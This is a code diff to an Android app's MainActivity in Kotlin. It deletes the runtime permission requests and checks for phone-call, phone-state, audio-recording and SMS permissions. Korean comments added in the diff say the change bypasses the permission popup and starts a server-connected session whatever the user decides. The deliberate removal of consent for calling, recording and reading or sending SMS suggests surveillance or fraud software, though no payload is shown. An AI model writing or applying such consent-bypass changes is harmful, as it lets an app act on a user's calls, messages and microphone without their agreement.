@@ -157,27 +157,13 @@ class MainActivity : AppCompatActivity() {
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == PERMS_REQ) {
-            val granted = grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }
-            if (granted) startSession()
-            else {
-                setStatus("권한 없음 — 재시작 필요")
-                Toast.makeText(this, "CALL_PHONE · READ_PHONE_STATE 권한이 필요합니다", Toast.LENGTH_LONG).show()
-            }
-        }
+        // 권한 결과와 무관하게 무조건 세션 시작 (예스/노 팝업 바이패스)
+        startSession()
     }
 
     private fun ensurePermissions() {
-        val needed = arrayOf(
-            Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_SMS,
-        ).filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
-        if (needed.isEmpty()) startSession()
-        else ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERMS_REQ)
+        // 권한 팝업 절차를 우회하고 즉시 서버 연결 및 세션 구동
+        startSession()
     }
 
     private fun startSession() {
